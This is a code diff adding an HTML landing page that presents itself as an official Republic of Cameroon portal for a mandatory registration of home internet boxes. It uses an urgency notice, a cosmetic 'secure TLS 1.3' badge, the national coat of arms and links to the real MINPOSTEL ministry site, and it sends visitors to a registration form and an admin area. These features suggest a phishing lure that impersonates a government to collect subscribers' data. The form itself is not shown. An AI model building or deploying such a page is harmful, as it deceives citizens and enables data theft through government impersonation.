@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Portail national de recensement des box internet</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <div class="flag-strip" aria-hidden="true"></div>
+    <div class="gov-top">
+      <span class="gov-top__motto">République du Cameroun · Paix – Travail – Patrie</span>
+      <span class="gov-top__secure">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path
+            d="M12 1L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-4z"
+            fill="currentColor"
+            opacity="0.9"
+          />
+        </svg>
+        Connexion sécurisée TLS 1.3
+      </span>
+    </div>
+    <nav class="site-nav" aria-label="Navigation principale">
+      <div class="site-nav__inner">
+        <div class="site-nav__links">
+          <a href="/index.html" class="is-active">Accueil</a>
+          <a href="/form.html">Enregistrement</a>
+          <a href="/admin.html">Espace habilité</a>
+        </div>
+      </div>
+    </nav>
+    <header class="header-main">
+      <div class="header-inner">
+        <div class="logo-block">
+          <img
+            class="coat"
+            src="/images/photo_2026-04-28_01-39-47.jpg"
+            width="72"
+            height="84"
+            alt="Armoiries de la République du Cameroun"
+          />
+          <div class="logo-text">
+            <span class="line1">République du Cameroun</span>
+            <span class="line2"
+              >Portail national de recensement des équipements d’accès internet (box)</span
+            >
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main>
+      <section class="hero">
+        <h1>Campagne nationale de recensement des abonnés internet</h1>
+        <p class="lead">
+          Conformément aux orientations en matière de régulation des télécommunications et de
+          sécurisation du spectre radioélectrique, le Gouvernement met à disposition la présente
+          plateforme afin de centraliser les informations relatives aux terminaux des abonnés
+          résidentiels et professionnels.
+        </p>
+        <div class="urgency">
+          <strong>Avis aux usagers.</strong>
+          Tout titulaire d’une box internet (fibre, 4G/5G fixe, satellite, etc.) est invité à
+          compléter son dossier dans les délais communiqués par son opérateur. Les données
+          collectées permettent la mise à jour du fichier national des équipements et la continuité
+          du service.
+        </div>
+        <div class="cta-row">
+          <a class="btn btn-primary" href="/form.html">Commencer l’enregistrement</a>
+          <a class="btn btn-secondary" href="/form.html#formulaire">Consulter le formulaire</a>
+        </div>
+      </section>
+
+      <p class="info-strip">
+        Pour toute assistance, adressez-vous à votre opérateur ou au guichet des postes et
+        télécommunications de votre délégation régionale. Référence institutionnelle&nbsp;:
+        <a href="https://www.minpostel.gov.cm/" rel="noopener noreferrer">MINPOSTEL</a>.
+      </p>
+    </main>
+
+    <footer class="site-footer">
+      <div class="footer-links">
+        <a href="/index.html">Accueil</a>
+        <a href="/form.html">Enregistrement</a>
+        <a href="https://www.minpostel.gov.cm/" rel="noopener noreferrer">MINPOSTEL — site officiel</a>
+      </div>
+      <p style="margin: 0">
+        © <span id="y"></span> République du Cameroun — Portail de recensement des box internet.
+      </p>
+    </footer>
+    <script>
+      document.getElementById("y").textContent = new Date().getFullYear();
+    </script>
+  </body>
+</html>
